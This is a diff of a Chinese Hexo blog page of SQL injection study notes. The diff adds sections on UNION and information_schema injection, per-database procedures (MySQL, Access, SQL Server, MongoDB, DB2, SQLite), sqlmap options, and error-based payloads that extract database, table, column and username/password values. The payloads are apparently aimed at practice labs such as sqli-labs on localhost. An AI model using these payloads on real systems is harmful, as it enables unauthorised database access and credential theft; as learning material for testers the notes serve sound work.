@@ -29,6 +29,8 @@
 </script>
 
 
+
+
 	<meta name="generator" content="Hexo 6.1.0"></head>
 
 	<body>
@@ -277,13 +279,14 @@
 </div>
 <div class="article-content">
     <div id="article" class="content">
-        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><blockquote>
+        <p>[TOC]</p>
+<h1><span id="一sql注入">一：SQL注入</span></h1><blockquote>
 <p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行，从而导致数据泄露，丢失甚至服务器瘫痪。如果代码中没有过滤或者过滤不严谨是会出现漏洞的。 </p>
 </blockquote>
 <blockquote>
 <p><img src="/../../images/xdsql/1650258465529.png" alt="1650258465529"></p>
 </blockquote>
-<h2 id="1-SQL注入的分类"><a href="#1-SQL注入的分类" class="headerlink" title="1.  SQL注入的分类"></a>1.  SQL注入的分类</h2><p><strong>从注入手法分类可以分为：</strong></p>
+<h2><span id="1-sql注入的分类">1.  SQL注入的分类</span></h2><p><strong>从注入手法分类可以分为：</strong></p>
 <blockquote>
 <p><strong>联合查询注入</strong></p>
 <p><strong>报错型注入</strong></p>
@@ -311,14 +314,14 @@
 <p><strong>HTTP头部（提交数据方式为HTTP头部）</strong></p>
 <p><strong>cookie数据（提交数据方式为cookie）</strong></p>
 </blockquote>
-<h2 id="1-2-判断注入点"><a href="#1-2-判断注入点" class="headerlink" title="1.2 判断注入点"></a>1.2 判断注入点</h2><blockquote>
+<h2><span id="12-判断注入点">1.2 判断注入点</span></h2><blockquote>
 <p>and 1&#x3D;1 页面正常<br>and 1&#x3D;2 页面错误</p>
 <p> <strong>可能存在注入，其实归根结底就是看我们的输入会不会对网站造成影响，即我们的操作有效</strong> </p>
 <p>SELECT * FROM user WHERE id&#x3D;1 and 1&#x3D;1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id&#x3D;1 and 1&#x3D;2 LIMIT 0,1 错误</p>
 <p>(有一个正常，整个语句都为真)<br>SELECT * FROM user WHERE id&#x3D;1 or 1&#x3D;1 LIMIT 0,1 正常<br>SELECT * FROM user WHERE id&#x3D;1 or 1&#x3D;2 LIMIT 0,1 正常</p>
 </blockquote>
-<h2 id="1-3-判断字段数"><a href="#1-3-判断字段数" class="headerlink" title="1.3 判断字段数"></a><strong>1.3 判断字段数</strong></h2><p>order by 1,2,3,4</p>
-<h2 id="1-4-常见的SQL数据库函数"><a href="#1-4-常见的SQL数据库函数" class="headerlink" title="1.4 常见的SQL数据库函数"></a>1.4 常见的SQL数据库函数</h2><blockquote>
+<h2><span id="13-判断字段数"><strong>1.3 判断字段数</strong></span></h2><p>order by 1,2,3,4</p>
+<h2><span id="14-常见的sql数据库函数">1.4 常见的SQL数据库函数</span></h2><blockquote>
 <ol>
 <li>version()——MySQL 版本</li>
 <li>user()——数据库用户名</li>
@@ -327,7 +330,7 @@
 <li>@@version_compile_os——操作系统版本</li>
 </ol>
 </blockquote>
-<h2 id="1-5-判断SQL数据库类型"><a href="#1-5-判断SQL数据库类型" class="headerlink" title="1.5 判断SQL数据库类型"></a>1.5 判断SQL数据库类型</h2><blockquote>
+<h2><span id="15-判断sql数据库类型">1.5 判断SQL数据库类型</span></h2><blockquote>
 <p><strong>前端与数据库类型</strong><br>asp：SQL Server，Access<br>.net：SQL Server<br>php：MySQL，PostgreSQL<br>java：Oracle，MySQL</p>
 <p><strong>根据端口判断</strong><br>Oracle：默认端口1521<br>SQL Server：默认端口1433<br>MySQL：默认端口3306</p>
 <p><strong>根据数据库特有函数来判断</strong><br>len和length<br>len()：SQL Server 、MySQL以及db2返回长度的函数。<br>length()：Oracle和INFORMIX返回长度的函数。</p>
@@ -335,8 +338,8 @@
 <p><strong>substring和substr</strong><br>MySQL两个函数都可以使用<br>Oracle只可调用substr<br>SQL Server只可调用substring</p>
 <p><strong>根据特殊符号进行判断</strong><br><strong>&#x2F;</strong>*  是MySQL数据库的注释符<br><strong>–</strong>  是Oracle和SQL Server支持的注释符<br><strong>; ** 是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库<br><strong>#</strong>  是MySQL中的注释符，返回错误则说明可能不是MySQL，另外也支持– 和&#x2F;</strong>&#x2F;</p>
 </blockquote>
-<h1 id="注入时信息收集"><a href="#注入时信息收集" class="headerlink" title="注入时信息收集"></a>注入时信息收集</h1><p><img src="/../../images/xdsql/1650259113342.png" alt="1650259113342"></p>
-<h3 id="1-信息收集："><a href="#1-信息收集：" class="headerlink" title="1.  信息收集："></a>1.  信息收集：</h3><blockquote>
+<h1><span id="二注入时信息收集">二：注入时信息收集</span></h1><p><img src="/../../images/xdsql/1650259113342.png" alt="1650259113342"></p>
+<h3><span id="1-信息收集">1.  信息收集：</span></h3><blockquote>
 <ol>
 <li>version()——MySQL 版本</li>
 <li>user()——数据库用户名</li>
@@ -345,7 +348,7 @@
 <li>@@version_compile_os——操作系统版本</li>
 </ol>
 </blockquote>
-<h3 id="1-2-数据库注入："><a href="#1-2-数据库注入：" class="headerlink" title="1.2 数据库注入："></a>1.2 数据库注入：</h3><p> 在mysql5.0以上版本存在一个 <code>information_schema</code>的数据库，它记录着所有的数据库，表名，列名。 </p>
+<h3><span id="12-数据库注入">1.2 数据库注入：</span></h3><p> 在mysql5.0以上版本存在一个 <code>information_schema</code>的数据库，它记录着所有的数据库，表名，列名。 </p>
 <p><img src="/../../images/xdsql/1650259264511.png" alt="1650259264511"></p>
 <ul>
 <li>数据库中“.”代表下级</li>
@@ -373,12 +376,12 @@
 </ol>
 <p>union select 1,username,password from users  LIMIT 1,1 –+</p>
 </blockquote>
-<h2 id="information-schema-注入"><a href="#information-schema-注入" class="headerlink" title="information_schema 注入"></a><strong>information_schema 注入</strong></h2><h1 id="类型及提交注入"><a href="#类型及提交注入" class="headerlink" title="类型及提交注入"></a>类型及提交注入</h1><blockquote>
+<h2><span id="13-information_schema-注入"><strong>1.3 information_schema 注入</strong></span></h2><h1><span id="三类型及提交注入">三：类型及提交注入</span></h1><blockquote>
 <p> 在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方 法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入</p>
 </blockquote>
-<h3 id="1-简要明确参数类型"><a href="#1-简要明确参数类型" class="headerlink" title="1. 简要明确参数类型"></a><strong>1. 简要明确参数类型</strong></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
+<h3><span id="1-简要明确参数类型"><strong>1. 简要明确参数类型</strong></span></h3><p><strong>根据网站上的参数或者值来判定注入的时候是否需要考虑符号的问题</strong></p>
 <p><strong>数字，字符，搜索，JSON 等</strong></p>
-<h3 id="1-2数字-x2F-字符"><a href="#1-2数字-x2F-字符" class="headerlink" title="1.2数字&#x2F;字符"></a><strong>1.2数字&#x2F;字符</strong></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
+<h3><span id="12数字x2f字符"><strong>1.2数字&#x2F;字符</strong></span></h3><p>数字型：基本不用引号，但是也不是绝对的，数字也可以加单引号</p>
 <p>字符型：一般采用单引号，但是不单止单引号 也可以是 ‘,”,%,),}等</p>
 <p><strong>即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉</strong></p>
 <blockquote>
@@ -396,9 +399,9 @@
 <p><strong>and  1&#x3D;1原始的意义是应该拼接到SQL语句中形成一个逻辑判断的情况，由于单引号的出现导致语句写到单引号里面成为一个单纯的字符串，没有了任何意义.</strong></p>
 <p><strong>根据网站自身的参数的值来判断在注人的时候是否需要考虑符合的问题。</strong></p>
 <p><img src="/../../images/xdsql/9.png" alt="9"></p>
-<h3 id="1-3-搜索"><a href="#1-3-搜索" class="headerlink" title="1.3 搜索"></a><strong>1.3 搜索</strong></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
+<h3><span id="13-搜索"><strong>1.3 搜索</strong></span></h3><p>​        <strong>将数据进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里</strong></p>
 <p>select * from user where name like ‘%xiaojun%’ </p>
-<h3 id="1-4-简要明确请求方法"><a href="#1-4-简要明确请求方法" class="headerlink" title="1.4 简要明确请求方法"></a><strong>1.4 简要明确请求方法</strong></h3><ul>
+<h3><span id="14-简要明确请求方法"><strong>1.4 简要明确请求方法</strong></span></h3><ul>
 <li><p><strong>GET,POST,COOKIE,REQUEST,HTTP 头等</strong></p>
 </li>
 <li><p><strong>请求方法可以通过浏览器开发者模式查看数据包的前缀</strong></p>
@@ -412,8 +415,8 @@
 <blockquote>
 <p>GET产生一个TCP数据包；POST产生两个TCP数据包。<br>         对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；<br>          而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。<br>           GET方法无法接收POST的值<br>   在POST情况下GET的值只要在网址后面就能接收<br>   GET、POST接收单个<br>   REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。</p>
 </blockquote>
-<h3 id="1-5-GET和POST两种基本请求方法和区别："><a href="#1-5-GET和POST两种基本请求方法和区别：" class="headerlink" title="1.5 GET和POST两种基本请求方法和区别："></a>1.5 GET和POST两种基本请求方法和区别：</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
-<h3 id="1-6-干扰符号"><a href="#1-6-干扰符号" class="headerlink" title="1.6 干扰符号"></a>1.6 干扰符号</h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
+<h3><span id="15-get和post两种基本请求方法和区别">1.5 GET和POST两种基本请求方法和区别：</span></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/logsharing/p/8448446.html">https://www.cnblogs.com/logsharing/p/8448446.html</a></p>
+<h3><span id="16-干扰符号">1.6 干扰符号</span></h3><p> SQL 语句干扰符号：’,”,%,),}等，具体需看写法</p>
 <p>Less-1为例：</p>
 <ol>
 <li><p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1&#39;">http://127.0.0.1/Less-1/?id=1&#39;</a>  and 1&#x3D;1</p>
@@ -429,6 +432,208 @@
 </ol>
 <p>–+负责把后面的单引号注释掉</p>
 <p><img src="/../../images/xdsql/13.png" alt="13"></p>
+<h1><span id="四union注入">四：UNION注入</span></h1><p> <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong> </p>
+<blockquote>
+<ol>
+<li><p><strong>利用order判断字段数</strong></p>
+<p>order by x(数字） 正常与错误的正常值  正确网页正常显示，错误网页报错</p>
+<p>?id&#x3D;1’ order by 3–+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p>
+<p>?id&#x3D;-1 union select 1,2,3 –+</p>
+</li>
+<li><p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名、用户名和版本号</strong></p>
+<p>?id&#x3D;-1 union select 1,database(),version() –+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，获取表名</strong>  </p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’已知库名’–+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，获取列名</strong></p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’已知表名’–+</p>
+</li>
+<li><p><strong>利用 union select 联合查询，获取字段值</strong></p>
+<p>?id&#x3D;-1’ union select 1,2,group_concat(已知字段名,’:’已知字段名) from 已知表名–+</p>
+</li>
+</ol>
+</blockquote>
+<h1><span id="五-information_schema注入">五： information_schema注入</span></h1><blockquote>
+<ol>
+<li><strong>获取所有数据库名</strong></li>
+</ol>
+<p>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
+<ol start="2">
+<li>获取指定数据库下的表名</li>
+</ol>
+<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’pikachu’</p>
+<ol start="3">
+<li>获取指定数据库指定表名下的列名信息</li>
+</ol>
+<p>union select 1,group_concat(column_name),3 from information_schema.columns where  table_name&#x3D;’users’ and table_schema&#x3D;’pikachu’</p>
+<ol start="4">
+<li>获取指定列下的字段信息</li>
+</ol>
+<p>union select 1,username,password from users  LIMIT 1,1 –+</p>
+</blockquote>
+<h1><span id="六-常见数据库注入方法">六 常见数据库注入方法</span></h1><h3><span id="1-mysql注入">1. Mysql注入</span></h3><blockquote>
+<p><strong>1.找到注入点 and 1&#x3D;1 and 1&#x3D;2 测试报错</strong></p>
+</blockquote>
+<blockquote>
+<p>2.order by 5 # 到5的时候报错，获取字段总数为4</p>
+</blockquote>
+<blockquote>
+<p>3.id&#x3D;0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息</p>
+</blockquote>
+<blockquote>
+<p>4.获取数据库信息</p>
+<p>user() &#x3D;&#x3D;&gt;root</p>
+<p>database() &#x3D;&#x3D;&gt;mozhe_Discuz_StormGroup</p>
+<p>version() &#x3D;&#x3D;&gt;5.7.22-0ubuntu0.16.04.1</p>
+</blockquote>
+<blockquote>
+<p>5.获取数据库表</p>
+<p>table_name 表名</p>
+<p>information_schema.tables 系统生成信息表</p>
+<p>table_schema&#x3D;数据库名16进制或者用单引号括起来</p>
+<p>改变limit 0，1中前一个参数，得到两个表 StormGroup_member notice</p>
+</blockquote>
+<blockquote>
+<p>6.获取列名</p>
+</blockquote>
+<blockquote>
+<p>结果如下 id,name,password,status</p>
+</blockquote>
+<blockquote>
+<p>7.脱裤</p>
+</blockquote>
+<h3><span id="2access注入">2.ACCESS注入</span></h3><p><img src="/../../images/xdsql/1650295362245.png" alt="1650295362245"></p>
+<blockquote>
+<p>1.and 1&#x3D;2 报错找到注入点</p>
+<p>2.order by 获取总字段</p>
+<p>3.猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表</p>
+<p>4.猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在</p>
+<p>5.脱裤 union select 1,username,passwd,4 from admin</p>
+</blockquote>
+<h3><span id="3-sql-server">3. Sql Server</span></h3><h2><span id="sql-serverx2fmssql注入">SQL server&#x2F;MSSQL注入</span></h2><ol>
+<li>介绍</li>
+</ol>
+<p>Microsoft SQL Server 是一个全面的数据库平台，使用集成的商业智能 (BI)工具提供了企业级的数据管理。Microsoft  SQL Server 数据库引擎为关系型数据和结构化数据提供了更安全可靠的存储功能，使您可以构建和管理用于业务的高可用和高性能的数据应用程序。</p>
+<ol>
+<li>过程</li>
+</ol>
+<p><strong>①</strong>判断数据库类型</p>
+<p>and exists (select * from sysobjects)–返回正常为mssql（也名sql server）</p>
+<p>and exists (select count(*) from sysobjects)–有时上面那个语句不行就试试这个哈</p>
+<p><strong>②</strong>判断数据库版本</p>
+<p>​    and 1&#x3D;@@version–这个语句要在有回显的模式下才可以哦</p>
+<p>​    and substring((select  @@version),22,4)&#x3D;’2008’–适用于无回显模式，后面的2008就是数据库版本，     返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是        2008的话就返回正常）</p>
+<p><strong>③</strong>获取所有数据库的个数 (一下3条语句可供选择使用)  </p>
+<p>\1. and 1&#x3D;(select quotename(count(name)) from master..sysdatabases)–</p>
+<p>\2. and 1&#x3D;(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) –</p>
+<p>\3. and 1&#x3D;(select str(count(name))%2b’|’ from master..sysdatabases where dbid&gt;5) –</p>
+<p>​     and 1&#x3D;(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) –</p>
+<p>说明：dbid从1-4的数据库一般为系统数据库.</p>
+<p><strong>⑤</strong>获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;&#x3D;2005，两条语句可供选择使用）  </p>
+<p>​    and 1&#x3D;(select quotename(name) from master..sysdatabases FOR XML PATH(‘’))–</p>
+<p>​    and 1&#x3D;(select ‘|’%2bname%2b’|’ from master..sysdatabases FOR XML PATH(‘’))–</p>
+<p><strong>⑥</strong>获取当前数据库 </p>
+<p>and db_name()&gt;0</p>
+<p>and 1&#x3D;(select db_name())–</p>
+<p><strong>⑦</strong>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于  mssql2005及以上版本）】</p>
+<p>​    and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))– </p>
+<p>​     and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’  FOR XML PATH(‘’))–</p>
+<p><strong>⑧</strong>获得表里的列</p>
+<p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p>
+<p>​     and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select  id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))– </p>
+<p>​     and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select  id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p>
+<p>⑨获取指定数据库中的表的列的数据库</p>
+<p>逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：</p>
+<p>​    and 1&#x3D;(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(‘’))–</p>
+<p>一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：</p>
+<p>​     and 1&#x3D;(select top N * from 指定数据库..指定表名 FOR XML PATH(‘’))–复制代码第一条语句：and  1&#x3D;(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(‘’))–测试效果图：———————————-加上where条件筛选结果出来会更加好，如：where  and name like ‘%user%’ 就会筛选出含有user关键词的出来。用在筛选表段时很不错。</p>
+<p>转自：<a target="_blank" rel="noopener" href="http://www.myhack58.com/Article/html/3/8/2015/63146.htm">http://www.myhack58.com/Article/html/3/8/2015/63146.htm</a></p>
+<h3><span id="4-oracle数据库">4. Oracle数据库</span></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
+<h3><span id="5-mongodb">5. MongoDB</span></h3><blockquote>
+<p>1.id&#x3D;1′ 单引号注入报错</p>
+<p>2.闭合语句，查看所有集合</p>
+<p>3.查看指定集合的数据</p>
+<p>[0] 代表第一条数据，可递增</p>
+</blockquote>
+<h3><span id="6-db2">6. DB2</span></h3><blockquote>
+<p>1.and 1&#x3D;2 判断注入点</p>
+<p>2.order by N 获取字段数</p>
+<p>3.爆当前数据库</p>
+<p>GAME_CHARACTER</p>
+<p>4.列表</p>
+<p>NAME</p>
+<p>5.脱裤</p>
+</blockquote>
+<h3><span id="7-sqlite">7. SQLite：</span></h3><blockquote>
+<p>1.找注入点 and 1&#x3D;1</p>
+<p>2.order by N 猜字段 4</p>
+<p>3.猜数据库</p>
+<p>offset &#x3D;&#x3D;&gt;0~2</p>
+<p>有三个数据库：</p>
+<p>WSTMart_reg</p>
+<p>notice_sybase</p>
+<p>sqlite_sequence</p>
+<p>4.猜列</p>
+<p>共有3个字段：</p>
+<p>id,name,password</p>
+<p>5.脱裤</p>
+</blockquote>
+<h3><span id="8-postgrasql注入原理">8. PostgraSQL注入原理</span></h3><p><a target="_blank" rel="noopener" href="https://www.webshell.cc/524.html">https://www.webshell.cc/524.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba0297da2c2e">https://www.jianshu.com/p/ba0297da2c2e</a></p>
+<h1><span id="七注入工具">七：注入工具</span></h1><h3><span id="11-sqlmap">1.1 SQLmap</span></h3><p>● –is-dba 当前用户权限（是否为root权限）<br>● –dbs 所有数据库<br>● –current-db 网站当前数据库<br>● –users 所有数据库用户<br>● –current-user 当前数据库用户<br>● –random-agent 构造随机user-agent<br>● –passwords 数据库密码<br>● –proxy <a target="_blank" rel="noopener" href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>● –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+<p><img src="/../../images/xdsql/14.png" alt="14"></p>
+<h1><span id="八盲注">八：盲注</span></h1><p>​    当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句</p>
+<p><strong>涉及知识点：</strong></p>
+<ul>
+<li><p><strong>报错盲注</strong></p>
+</li>
+<li><p><strong>延迟盲注</strong></p>
+</li>
+<li><p><strong>布尔盲注</strong></p>
+</li>
+</ul>
+<p><strong>ASCCI码表</strong></p>
+<p><img src="/../../images/xdsql/ascci.png" alt="1646537964629"></p>
+<h3><span id="1-报错盲注">1. 报错盲注</span></h3><p>分享一个讲的不错的视频：</p>
+<iframe src="//player.bilibili.com/player.html?aid=715622672&bvid=BV12Q4y1o7Ya&cid=338198345&page=17" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
+
+<p>重点理解:<br>我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的SQL查询方式 </p>
+<blockquote>
+<p> select查询数据<br>在网站应用中进行数据显示查询操作<br>例: select * from news where id&#x3D;$id</p>
+<p>insert插入数据<br>在网站应用中进行用户注册添加等操作<br>例: insert into news (id, url, text) values (2, ‘x’,’$t’)</p>
+<p>delete删除数据<br>后台管理里面删除文章删除用户等操作<br>例: delete from news where id&#x3D;$id </p>
+<p>update更新数据<br>会员或后台中心数据同步或缓存等操作<br>例: update user set pwd&#x3D;’$p’ where id&#x3D;2 and username&#x3D; ‘admin’</p>
+<p>order by排序数据<br>一般结合表名或列名进行数据排序操作<br>例: select * from news order by $id<br>例: select id, name, price from news order by $order </p>
+</blockquote>
+<ol>
+<li>获取数据库名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdsql/5.png" alt="1646480666891"></p>
+<ol start="2">
+<li>爆表名</li>
+</ol>
+<blockquote>
+<p>and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)–+</p>
+</blockquote>
+<p><img src="/../../images/xdsql/6..png" alt="1646480854172"></p>
+<ol start="3">
+<li>爆字段</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdsql/7.png" alt="1646481042045"></p>
+<ol start="4">
+<li>爆字段数据</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdsql/84.png" alt="1646481199468"></p>
 
     </div>
 </div>
@@ -468,6 +673,18 @@
     </a>
     
 </div>
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
 		
 <link rel="stylesheet" href="/css/food.css">
 
